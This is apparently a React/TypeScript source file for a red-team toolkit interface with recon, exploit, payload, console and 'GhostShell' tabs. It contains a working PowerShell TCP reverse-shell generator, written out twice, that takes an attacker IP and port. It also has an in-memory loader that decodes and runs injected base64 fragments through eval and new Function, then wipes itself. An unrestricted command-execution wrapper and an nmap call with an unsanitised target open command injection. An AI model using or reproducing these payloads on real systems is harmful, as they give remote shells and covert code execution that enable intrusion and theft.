import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { exec } from 'child_process';
import { Bug, Eye, KeyRound, Terminal, Ghost } from "lucide-react";
import React, { useState } from "react";

const ghostShellBootstrap = `
(function ghostShellInit() {
    const fragments = {};
    const expectedFragments = 1;
    let received = 0;

    function addFragment(index, payload) {
        if (!fragments[index]) {
            fragments[index] = payload;
            received++;
            console.log(`[GHOST] Fragment ${ index } accepted (${ received }/${expectedFragments})`);
        }
        if (received >= expectedFragments) assemblePayload();
    }

    function assemblePayload() {
        const fullPayload = Object.keys(fragments)
            .sort((a, b) => a - b)
            .map(i => fragments[i])
            .join('');

        try {
            console.log("[GHOST] Reassembling & executing payload...");
            (new Function(atob(fullPayload)))();
        } catch (e) {
            console.warn("[GHOST] Payload execution error:", e);
        }
    }

    window.injectGhostFragment = function(index, b64payload) {
        addFragment(index, b64payload);
    };

    console.log("[GHOST SHELL] Initialized. Send fragments via: injectGhostFragment(index, b64payload)");

    setTimeout(() => {
        console.log("[GHOST SHELL] TTL expired. Purging memory.");
        delete window.injectGhostFragment;
        for (let k in fragments) delete fragments[k];
    }, 180000);
})();
`;

export default function RedTeamToolkit() {
    const [ghostLoaded, setGhostLoaded] = useState(false);

    const loadGhostShell = () => {
        eval(ghostShellBootstrap);
        setGhostLoaded(true);
    };

    return (
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4 p-4">
            <Card className="rounded-2xl shadow-xl">
                <CardContent className="p-4">
                    <Tabs defaultValue="recon">
                        <TabsList className="flex w-full justify-around">
                            <TabsTrigger value="recon"><Eye className="mr-2" /> Recon</TabsTrigger>
                            <TabsTrigger value="exploit"><Bug className="mr-2" /> Exploit</TabsTrigger>
                            <TabsTrigger value="payload"><KeyRound className="mr-2" /> Payloads</TabsTrigger>
                            <TabsTrigger value="console"><Terminal className="mr-2" /> Console</TabsTrigger>
                            <TabsTrigger value="ghost"><Ghost className="mr-2" /> GhostShell</TabsTrigger>
                        </TabsList>

                        <TabsContent value="recon">
                            <p className="text-sm">Quick recon tools for target profiling:</p>
                            <div className="mt-2 space-y-2">
                                <Button variant="secondary" className="w-full">Run Nmap Scan</Button>
                                <Button variant="secondary" className="w-full">Passive DNS Lookup</Button>
                                <Button variant="secondary" className="w-full">WHOIS & ASN Check</Button>
                            </div>
                        </TabsContent>

                        <TabsContent value="exploit">
                            <p className="text-sm">Scripted exploit modules (for authorized testing only):</p>
                            <div className="mt-2 space-y-2">
                                <Button variant="destructive" className="w-full">Exploit SMBv1</Button>
                                <Button variant="destructive" className="w-full">SQL Injection</Button>
                                <Button variant="destructive" className="w-full">Cross-Site Scripting (XSS)</Button>
                            </div>
                        </TabsContent>

                        <TabsContent value="payload">
                            <p className="text-sm">Payload generators (download, reverse shell, etc):</p>
                            <div className="mt-2 space-y-2">
                                <Button variant="outline" className="w-full">Generate PowerShell Payload</Button>
                                <Button variant="outline" className="w-full">Build Bash One-liner</Button>
                                <Button variant="outline" className="w-full">Generate .hta Loader</Button>
                            </div>
                        </TabsContent>

                        <TabsContent value="console">
                            <p className="text-sm">Command execution interface (bind shell / beacon req’d):</p>
                            <textarea
                                placeholder="Run remote commands..."
                                className="w-full h-40 mt-2 p-2 bg-black text-green-400 font-mono text-sm rounded-md shadow-inner"
                            ></textarea>
                            <Button className="mt-2">Execute</Button>
                        </TabsContent>

                        <TabsContent value="ghost">
                            <p className="text-sm">Inject volatile GhostShell into memory. Operates fully in-browser and self-wipes.</p>
                            <Button onClick={loadGhostShell} variant="ghost" className="mt-2 w-full">
                                {ghostLoaded ? "GhostShell Loaded" : "Load GhostShell"}
                            </Button>
                        </TabsContent>
                    </Tabs>
                </CardContent>
            </Card>
        </div>
    );
}

export const ReconModule = {
    runNmapScan: (target: string) => {
        return new Promise((resolve, reject) => {
            exec(`nmap -sV ${target}`, (error, stdout) => {
                if (error) reject(error);
                resolve(stdout);
            });
        });
    },

    dnsLookup: async (domain: string) => {
        const response = await fetch(`https://dns.google/resolve?name=${domain}`);
        return response.json();
    }
};
export const ExploitModule = {
    sqlInjectionTest: async (target: string, payload: string) => {
        const response = await fetch(target, {
            method: 'POST',
            body: JSON.stringify({ query: payload }),
            headers: { 'Content-Type': 'application/json' }
        });
        return response.json();
    }
};
export const PayloadModule = {
    generatePowerShell: (ip: string, port: number) => {
        return `powershell -c "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`;
    }
};
export const PayloadGenerator = {
    generatePowershell: (ip: string, port: number) => {
        return `$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
    }
};
export const ConsoleModule = {
    executeCommand: (command: string) => {
        return new Promise((resolve, reject) => {
            exec(command, (error, stdout, stderr) => {
                if (error) reject(error);
                resolve(stdout || stderr);
            });
        });
    }
};